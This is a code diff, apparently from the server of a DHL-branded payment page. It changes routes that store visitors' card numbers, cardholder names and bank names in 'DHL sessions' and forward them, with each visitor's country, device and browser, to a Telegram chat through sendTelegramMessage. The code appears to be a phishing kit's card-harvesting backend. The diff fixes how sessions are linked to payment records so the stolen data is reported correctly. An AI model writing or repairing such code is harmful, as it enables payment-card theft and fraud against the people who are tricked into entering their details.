@@ -111,6 +111,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       await storage.createDhlSession({
         sessionId,
+        paymentId: record.id,
         cardNumber: req.body.cardNumber,
         cardholderName: req.body.cardholderName,
         bankName,
@@ -179,8 +180,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         const clientInfo = await getClientInfo(req);
         
         // Get DHL session to include sessionId in notification
-        const sessions = await storage.getDhlSessions();
-        const session = sessions.find(s => s.paymentId === id);
+        const sessions = await storage.getAllDhlSessions();
+        const session = sessions.find((s: any) => s.paymentId === id);
         
         const notification = formatPaymentNotification({
           cardNumber: updated.cardNumber,
@@ -195,7 +196,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           country: clientInfo.country,
           device: clientInfo.device,
           browser: clientInfo.browser,
-          sessionId: session?.id,
+          sessionId: session?.sessionId,
         });
 
         await sendTelegramMessage(
@@ -235,8 +236,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         const clientInfo = await getClientInfo(req);
         
         // Get DHL session to include sessionId in notification
-        const sessions = await storage.getDhlSessions();
-        const session = sessions.find(s => s.paymentId === id);
+        const sessions = await storage.getAllDhlSessions();
+        const session = sessions.find((s: any) => s.paymentId === id);
         
         const notification = formatPaymentNotification({
           cardNumber: updated.cardNumber,
@@ -251,7 +252,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           country: clientInfo.country,
           device: clientInfo.device,
           browser: clientInfo.browser,
-          sessionId: session?.id,
+          sessionId: session?.sessionId,
         });
 
         await sendTelegramMessage(
